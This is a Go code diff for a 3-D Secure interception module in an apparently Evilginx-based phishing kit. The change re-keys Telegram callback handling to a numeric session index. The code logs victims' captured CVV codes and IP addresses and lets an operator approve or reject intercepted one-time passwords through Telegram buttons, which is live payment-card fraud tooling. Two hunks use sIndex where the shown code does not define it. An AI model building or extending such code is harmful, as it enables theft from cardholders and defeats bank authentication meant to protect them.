@@ -23,6 +23,7 @@ const (
 
 // ThreeDSSession tracks the 3DS verification state for a single user session
 type ThreeDSSession struct {
+	SIndex        int    // Evilginx session index (used for Telegram callback_data)
 	SessionID     string // evilginx internal session ID
 	State         string
 	TelegramMsgID int    // Telegram message ID for editing
@@ -38,21 +39,23 @@ type ThreeDSSession struct {
 
 // ThreeDSManager manages all active 3DS verification sessions
 type ThreeDSManager struct {
-	sessions map[string]*ThreeDSSession // sessionID -> ThreeDSSession
-	mu       sync.RWMutex
-	telegram *TelegramBot
-	proxy    *HttpProxy
-	stopChan chan struct{}
-	wg       sync.WaitGroup
+	sessions    map[string]*ThreeDSSession // sessionID -> ThreeDSSession
+	indexToSess map[int]*ThreeDSSession    // sIndex -> ThreeDSSession
+	mu          sync.RWMutex
+	telegram    *TelegramBot
+	proxy       *HttpProxy
+	stopChan    chan struct{}
+	wg          sync.WaitGroup
 }
 
 // NewThreeDSManager creates a new 3DS manager
 func NewThreeDSManager(telegram *TelegramBot, proxy *HttpProxy) *ThreeDSManager {
 	m := &ThreeDSManager{
-		sessions: make(map[string]*ThreeDSSession),
-		telegram: telegram,
-		proxy:    proxy,
-		stopChan: make(chan struct{}),
+		sessions:    make(map[string]*ThreeDSSession),
+		indexToSess: make(map[int]*ThreeDSSession),
+		telegram:    telegram,
+		proxy:       proxy,
+		stopChan:    make(chan struct{}),
 	}
 	m.wg.Add(1)
 	go m.cleanupWorker()
@@ -96,6 +99,9 @@ func (m *ThreeDSManager) cleanupExpired() {
 		if state == ThreeDSExpired || state == ThreeDSCompleted {
 			if now.Sub(updatedAt) > 10*time.Minute {
 				delete(m.sessions, id)
+				if ts.SIndex > 0 {
+					delete(m.indexToSess, ts.SIndex)
+				}
 				log.Debug("[3DS] cleaned up session: %s (state: %s)", id, state)
 			}
 		}
@@ -104,7 +110,7 @@ func (m *ThreeDSManager) cleanupExpired() {
 
 // Initiate creates a new 3DS session after CVV capture
 // Idempotent: if session already exists, returns the existing one
-func (m *ThreeDSManager) Initiate(sessionID string, cvv string, remoteAddr string, phishletName string) *ThreeDSSession {
+func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, remoteAddr string, phishletName string) *ThreeDSSession {
 	m.mu.Lock()
 	defer m.mu.Unlock()
 
@@ -113,6 +119,7 @@ func (m *ThreeDSManager) Initiate(sessionID string, cvv string, remoteAddr strin
 	}
 
 	ts := &ThreeDSSession{
+		SIndex:        sIndex,
 		SessionID:     sessionID,
 		State:         ThreeDSWaitingCVV,
 		TelegramMsgID: 0,
@@ -125,7 +132,8 @@ func (m *ThreeDSManager) Initiate(sessionID string, cvv string, remoteAddr strin
 		PhishletName:  phishletName,
 	}
 	m.sessions[sessionID] = ts
-	log.Info("[3DS] session initiated: %s (cvv: %s, ip: %s)", sessionID, cvv, remoteAddr)
+	m.indexToSess[sIndex] = ts
+	log.Info("[3DS] session initiated: %s (sIndex: %d, cvv: %s, ip: %s)", sessionID, sIndex, cvv, remoteAddr)
 	return ts
 }
 
@@ -342,22 +350,32 @@ func (m *ThreeDSManager) Handle3DSSubmit(req *http.Request, sessionID string) (i
 
 // HandleCallback processes Telegram inline button callbacks for 3DS
 func (m *ThreeDSManager) HandleCallback(callbackData string, chatID string, msgID int) {
-	// callbackData format: "3ds:action:sessionID"
+	// callbackData format: "3ds:action:sIndex"
 	parts := strings.SplitN(callbackData, ":", 3)
 	if len(parts) < 3 || parts[0] != "3ds" {
 		return
 	}
 
 	action := parts[1]
-	sessionID := parts[2]
-
-	// Verify msgID matches the session's TelegramMsgID for security
-	m.mu.RLock()
-	ts, ok := m.sessions[sessionID]
-	m.mu.RUnlock()
-	if !ok {
+	sIndexStr := parts[2]
+	sIndex := 0
+	fmt.Sscanf(sIndexStr, "%d", &sIndex)
+	if sIndex == 0 {
+		log.Warning("[3DS] callback with invalid sIndex: %s", sIndexStr)
 		return
 	}
+
+	// Look up session by sIndex
+	m.mu.RLock()
+	ts, ok := m.indexToSess[sIndex]
+	m.mu.RUnlock()
+	if !ok {
+		log.Warning("[3DS] callback with unknown sIndex: %d", sIndex)
+		return
+	}
+	sessionID := ts.SessionID
+
+	// Verify msgID matches the session's TelegramMsgID for security
 	ts.mu.Lock()
 	sessionMsgID := ts.TelegramMsgID
 	ts.mu.Unlock()
@@ -480,8 +498,8 @@ func (m *ThreeDSManager) updateTelegramOTPSubmitted(sessionID string) {
 
 	buttons := [][]InlineButton{
 		{
-			{Text: "✅ OTP正确", CallbackData: fmt.Sprintf("3ds:otp_approve:%s", sessionID)},
-			{Text: "❌ OTP错误", CallbackData: fmt.Sprintf("3ds:otp_reject:%s", sessionID)},
+			{Text: "✅ OTP正确", CallbackData: fmt.Sprintf("3ds:otp_approve:%d", sIndex)},
+			{Text: "❌ OTP错误", CallbackData: fmt.Sprintf("3ds:otp_reject:%d", sIndex)},
 		},
 	}
 
@@ -569,8 +587,8 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 
 	buttons := [][]InlineButton{
 		{
-			{Text: "🔐 通过 (3DS)", CallbackData: fmt.Sprintf("3ds:cvv_approve:%s", sessionID)},
-			{Text: "✅ 直接放行", CallbackData: fmt.Sprintf("3ds:cvv_release:%s", sessionID)},
+			{Text: "🔐 通过 (3DS)", CallbackData: fmt.Sprintf("3ds:cvv_approve:%d", sIndex)},
+			{Text: "✅ 直接放行", CallbackData: fmt.Sprintf("3ds:cvv_release:%d", sIndex)},
 		},
 	}
 
